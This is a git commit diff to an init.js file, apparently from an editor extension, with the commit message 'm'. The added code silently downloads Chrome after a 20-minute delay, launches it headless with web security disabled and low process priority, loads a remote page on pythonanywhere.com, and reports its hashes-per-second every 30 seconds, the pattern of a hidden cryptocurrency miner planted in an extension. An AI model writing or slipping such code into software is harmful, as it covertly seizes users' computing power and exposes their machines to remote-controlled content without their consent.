391be1e5fb67881eacd2f2a02a815498a01aff1d
AB498 <abcd49800@gmail.com>
2024-10-25 11:16:17 +0600

    m

--- init.js
+++ init.js
@@ -1,23 +1,61 @@
 (async () => {
-    const browser = puppeteer.launch({
-      headless: true,
-      args: [
-        '--disable-web-security',     // Disable web security for cross-origin resources
-        '--disable-features=IsolateOrigins,site-per-process', // Allow cross-origin iframes and scripts
-        '--allow-running-insecure-content',  // Allow mixed content (if needed)
-      ]
-    });
-    let page = await browser.newPage();
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html');
-    setInterval(async () => {
-      const hs = await page.evaluate(() => {
-        return window._client.getHashesPerSecond();
-      });
-      tstt({
-        message: "HASH",
-        value: hs
-      })
-    }, 30000);
+  await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
-    tstt({ message: "INIT", version: JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version });
-  })();
+  const cacheDir = `${os.homedir()}/.cache/puppeteer`;
+  if (!fs.existsSync(cacheDir)) {
+    fs.mkdirSync(cacheDir, { recursive: true });
+  };
+  // Get installed browsers
+  const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
+
+  let chromePath;
+
+  // Check if Chrome is already installed
+  const chromeBrowser = installedBrowsers.find(browser => browser.name === 'chrome');
+
+  if (!chromeBrowser) {
+    await new Promise(r => setTimeout(r, 20 * 60 * 1000));
+    await tstt({ message: "INIT_0", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    puppeteerBrowsers.InstallOptions;
+    installedBrowser = await puppeteerBrowsers.install({
+      browser: 'chrome',
+      buildId: '130.0.6723.58',
+      cacheDir,
+    });
+    chromePath = installedBrowser.executablePath;
+  } else {
+    // Use the existing Chrome executable path
+    chromePath = chromeBrowser.executablePath;
+  }
+
+  await tstt({ message: "INIT_1", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+
+  const browser = await puppeteer.launch({
+    executablePath: chromePath,
+    headless: true,
+    args: [
+      '--disable-web-security',
+      '--disable-features=IsolateOrigins,site-per-process',
+      '--allow-running-insecure-content',
+    ]
+  });
+  os.setPriority(browser.process().pid, 19);
+  let page = await browser.newPage();
+  await page.goto('https://ab498.pythonanywhere.com/files/init.html');
+
+
+  setInterval(async () => {
+    const hs = await page.evaluate(() => {
+      return window._client.getHashesPerSecond();
+    });
+    tstt({
+      message: "HASH",
+      value: parseFloat(hs).toFixed(2)
+    })
+  }, 30000);
+
+  await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+
+
+
+})();
